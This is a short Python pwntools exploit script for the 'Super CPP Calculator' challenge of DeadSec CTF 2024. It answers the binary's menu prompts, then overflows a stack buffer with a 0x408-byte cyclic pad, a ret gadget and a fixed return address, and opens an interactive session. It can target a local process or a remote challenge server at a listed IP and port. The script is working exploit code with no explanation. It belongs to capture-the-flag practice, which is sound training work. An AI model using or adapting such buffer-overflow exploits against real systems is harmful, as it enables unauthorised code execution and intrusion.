#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/DeadSec CTF 2024/pwn/Super CPP Calculator/test')
elf = ELF(TARGET)
rop = ROP(elf)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'10')
    r.sendlineafter(b'> ', b'0.001')
    r.sendlineafter(b'> ', str(0x539).encode())
    r.sendlineafter(b'> ', cyclic(0x408) + p64(rop.ret[0]) + p64(0x401740))
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('34.30.207.157', 31007)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
